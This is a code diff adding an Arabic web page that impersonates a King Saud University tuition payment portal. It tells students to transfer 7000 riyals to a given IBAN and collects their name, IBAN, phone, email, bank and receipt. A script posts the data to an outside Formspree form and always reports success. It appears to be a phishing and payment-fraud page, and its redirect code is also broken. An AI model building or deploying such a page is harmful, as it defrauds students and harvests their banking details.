@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سداد رسوم الترم - جامعة الملك سعود</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="container">
+    <img src="logo.png" alt="شعار الجامعة" class="logo"> <!-- تأكد من وضع المسار الصحيح لشعار الجامعة -->
+    <h2>بوابة القبول الأكاديمي </h2>
+    <p> يتم سداد القسط الاول من الرسوم الدراسية مبلغ 7000 ريال الى الايبان التالي</p>
+    <p><strong>SA7180000551608016088919</strong></p>
+
+    <form id="paymentForm">
+        <div class="form-group">
+            <label for="accountName">:اسم صاحب الحساب</label>
+            <input type="text" name="accountName" id="accountName" required>
+        </div>
+        <div class="form-group">
+            <label for="iban">:رقم الإيبان</label>
+            <input type="text" name="iban" id="iban" required>
+        </div>
+        <div class="form-group">
+            <label for="phone">:رقم الجوال</label>
+            <input type="tel" name="phone" id="phone" required>
+        </div>
+        <div class="form-group">
+            <label for="email">:البريد الإلكتروني</label>
+            <input type="email" name="email" id="email" required>
+        </div>
+        <div class="form-group">
+            <label for="bankName">:اسم البنك المودع منه</label>
+            <input type="text" name="bankName" id="bankName" required>
+        </div>
+        <div class="form-group">
+            <label for="receipt">:إرفاق إيصال السداد</label>
+            <input type="file" name="receipt" id="receipt" accept=".jpg, .jpeg, .png, .pdf" required>
+        </div>
+        <button type="submit" class="button"  >إرسال</button>
+    </form>
+    <p id="responseMessage" style="text-align: center;"></p>
+</div>
+
+<div class="footer">
+    &copy; 2024 جامعة الملك سعود. جميع الحقوق محفوظة.
+</div>
+
+<script>
+document.getElementById('paymentForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+    const formData = new FormData(this);
+
+    fetch('https://formspree.io/f/xyzzeqkr', { // استبدل YOUR_FORM_ID بمعرف النموذج الخاص بك
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            window.location.herf='suc.html';
+    })
+    .catch(error => {
+        window.location.herf='suc.html';
+    });
+});
+</script>
+
+</body>
+</html>
